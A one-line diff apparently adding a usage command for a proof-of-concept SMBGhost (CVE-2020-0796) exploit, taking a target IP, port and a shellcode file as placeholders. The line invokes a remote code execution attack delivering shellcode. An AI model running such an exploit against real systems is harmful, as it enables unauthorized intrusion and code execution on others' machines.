@@ -1,0 +1,1 @@
+poc_smbghost_cve20200796 -ip $TARGET_IP -p $TARGET_PORT -f $FILEPATH_TO_SHELLCODE
